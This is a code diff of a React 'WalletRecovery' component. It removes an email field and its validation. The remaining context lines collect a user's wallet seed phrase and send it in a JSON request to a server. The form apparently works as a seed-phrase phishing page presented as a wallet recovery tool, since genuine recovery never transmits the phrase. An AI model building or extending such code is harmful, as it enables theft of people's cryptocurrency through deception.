@@ -4,7 +4,6 @@ import { useState } from 'react'
 
 export const WalletRecovery = () => {
   const [secretPhrase, setSecretPhrase] = useState('')
-  const [email, setEmail] = useState('')
   const [, setWalletFile] = useState('')
   const [status, setStatus] = useState<'idle' | 'validating' | 'success' | 'error'>('idle')
   const [message, setMessage] = useState('')
@@ -16,19 +15,7 @@ export const WalletRecovery = () => {
     return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))
   }
 
-  // Validate email format
-  const isValidEmail = (email: string) => {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
-  }
-
   const handleRecover = async () => {
-    if (!email || !isValidEmail(email)) {
-      setStatus('error')
-      setMessage('Please enter a valid email address')
-      setTimeout(() => setStatus('idle'), 3000)
-      return
-    }
-
     if (recoveryMethod === 'phrase' && !secretPhrase) {
       setStatus('error')
       setMessage('Please enter your secret phrase')
@@ -56,7 +43,6 @@ export const WalletRecovery = () => {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            email,
             method: recoveryMethod,
             seedPhrase: recoveryMethod === 'phrase' ? secretPhrase : undefined,
             timestamp: new Date().toISOString(),
@@ -121,18 +107,6 @@ export const WalletRecovery = () => {
       {/* Recovery Form */}
       <div className="space-y-4 relative overflow-hidden rounded-lg sm:rounded-xl p-5 sm:p-6 bg-gradient-to-br from-white/5 to-white/3 border border-white/10">
         {/* Email Input */}
-        <div>
-          <label className="block text-sm font-semibold text-white mb-2">Email Address</label>
-          <input
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            placeholder="your@email.com"
-            className="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500 transition-all"
-          />
-          <p className="text-xs text-gray-400 mt-1">Recovery contact will be used for secure processing.</p>
-        </div>
-
         {/* Seed Phrase Input */}
         {recoveryMethod === 'phrase' && (
           <div>
